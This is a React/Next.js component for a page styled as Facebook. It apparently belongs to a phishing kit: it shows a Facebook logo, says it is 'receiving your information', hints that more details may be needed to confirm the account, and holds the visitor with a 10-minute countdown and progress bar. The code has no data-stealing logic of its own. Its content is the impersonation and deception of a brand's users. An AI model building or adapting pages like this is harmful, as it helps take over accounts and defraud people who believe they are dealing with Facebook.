'use client'

import { useState, useEffect } from 'react'
import Image from 'next/image'
import { Progress } from "@/components/ui/progress"

export default function ReviewingInformation() {
  const [timeLeft, setTimeLeft] = useState(600) // 10 minutes in seconds
  const [progress, setProgress] = useState(0)

  useEffect(() => {
    const timer = setInterval(() => {
      setTimeLeft((prevTime) => {
        if (prevTime > 0) {
          const newTime = prevTime - 1
          setProgress((600 - newTime) / 6) // Update progress (0-100)
          return newTime
        }
        return 0
      })
    }, 1000)

    return () => clearInterval(timer)
  }, [])

  const formatTime = (seconds: number) => {
    const minutes = Math.floor(seconds / 60)
    const remainingSeconds = seconds % 60
    return `${minutes}:${remainingSeconds.toString().padStart(2, '0')}`
  }

  return (
    <div className="min-h-screen bg-[#f0f2f5] flex flex-col">
      <header className="w-full bg-white shadow-sm">
        <div className="container mx-auto px-4 py-2">
          <Image
            src="https://hebbkx1anhila5yf.public.blob.vercel-storage.com/image-KMqynDXovAOlAsLRmAjbWZSJw8Ogbj.png"
            alt="Facebook Logo"
            width={40}
            height={40}
          />
        </div>
      </header>

      <main className="flex-grow flex items-center justify-center py-8">
        <div className="bg-white rounded-lg shadow-md w-full max-w-[500px] p-6">
          <h1 className="text-2xl font-bold text-center mb-6">Hi, We are receiving your information</h1>
          <div className="flex items-start space-x-6 mb-6">
            <Image
              src="https://hebbkx1anhila5yf.public.blob.vercel-storage.com/image-g0QJUfbxDlX2iQTq6byW5AbIbAm4wy.png"
              alt="Robot Icon"
              width={100}
              height={100}
              className="flex-shrink-0"
            />
            <div className="space-y-4">
              <p className="text-sm">
                Reviewing your activity takes just a few more moments. We might require additional
                information to confirm that this is your account
              </p>
              <p className="text-sm">
                Please wait, this could take up to 10-20 minutes, please be patient while we review
                your case... (wait {formatTime(timeLeft)})
              </p>
            </div>
          </div>
          <Progress value={progress} className="w-full h-2" />
        </div>
      </main>
    </div>
  )
}